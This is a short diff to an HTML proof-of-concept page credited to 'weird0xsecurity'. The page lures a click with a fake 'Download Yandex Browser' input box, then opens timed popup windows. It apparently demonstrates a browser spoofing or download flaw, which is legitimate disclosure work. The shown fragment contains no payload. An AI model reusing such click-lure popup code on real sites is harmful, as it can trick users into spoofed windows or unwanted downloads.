@@ -7,7 +7,7 @@
 </head>
 <body>
   <center><h2>POC by weird0xsecurity!</h2></center>
-  <input type="text" id="triggerInput" placeholder="Download Yandex Browser For Desktop Here!">
+  <input type="text" id="triggerInput" rows="4" cols="10" placeholder="Download Yandex Browser For Desktop Here!">
 
   <script>
     document.getElementById('triggerInput').addEventListener('click', function() {
@@ -15,7 +15,7 @@
  setTimeout(function() {
         openWin();
  }, 500);
- window.open('https://www.yandex.com', '_blank');
+ window.open('https://browser.yandex.com/', '_blank');
     }, { once: false }); // Use { once: true } to ensure it only fires once
 
     // Download helper
